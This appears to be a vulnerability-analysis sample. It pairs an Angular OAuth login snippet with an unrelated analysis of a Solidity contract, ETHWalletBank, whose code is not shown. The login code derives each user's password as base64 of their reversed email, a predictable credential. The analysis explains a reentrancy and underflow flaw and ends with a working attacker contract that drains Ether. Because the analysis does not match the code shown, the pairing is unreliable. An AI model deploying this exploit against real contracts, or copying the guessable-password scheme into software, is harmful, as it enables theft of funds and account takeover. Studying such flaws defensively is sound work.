ngOnInit (): void {
  this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
    next: (profile: any) => {
      const password = btoa(profile.email.split('').reverse().join(''))
      this.userService.save({ email: profile.email, password, passwordRepeat: password }).subscribe({
        next: () => {
          this.login(profile)
        },
        error: () => { this.login(profile) }
      })
    },
    error: (error) => {
      this.invalidateSession(error)
      this.ngZone.run(async () => await this.router.navigate(['/login']))
    }
  })
}

analysis:
The `withdraw` function in `ETHWalletBank` is vulnerable to a reentrancy attack due to a defective reentrancy guard and a violation of the Checks-Effects-Interactions (CEI) pattern.

1. Source: An external user or malicious contract invokes `withdraw(uint _amount)`.
2. Flawed Guard: The function attempts to guard against reentrancy using `userWithdrawing[msg.sender] <= 1`. When first called, `userWithdrawing[msg.sender]` is 0, so it passes and is incremented to 1.
3. Sink: On line 29, control flow is handed to the caller via an external call `msg.sender.call{ value: _amount }("")` before updating `balances[msg.sender]`.
4. Bypass / Reentrancy: When `msg.sender` receives Ether, its fallback/receive function re-enters `withdraw(0.1 ether)`. In the nested invocation, `balances[msg.sender]` has not yet been decremented, so the balance check passes. Next, `userWithdrawing[msg.sender] <= 1` evaluates to true (since `1 <= 1`), incrementing `userWithdrawing[msg.sender]` to 2 and executing a second external transfer of 0.1 ether.
5. Post-exploitation Underflow: When both invocations unwind to line 32 (`balances[msg.sender] -= _amount`), since Solidity 0.6.12 does not check for arithmetic underflows on `-=` unless `SafeMath.sub` is used, the balance underflows from 0 to `2^256 - 0.1 ether`. This grants the attacker an almost infinite balance, allowing them to repeatedly call `withdraw` and drain all remaining Ether in the contract.

Conceptual Exploit Payload:
```solidity
contract Attack {
    ETHWalletBank public bank;
    bool public hasReentered;

    constructor(address _bank) public payable {
        bank = ETHWalletBank(_bank);
    }

    function attack() external payable {
        bank.ethdeposit{value: 0.1 ether}(address(this));
        bank.withdraw(0.1 ether);
    }

    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            bank.withdraw(0.1 ether);
        }
    }
}
```

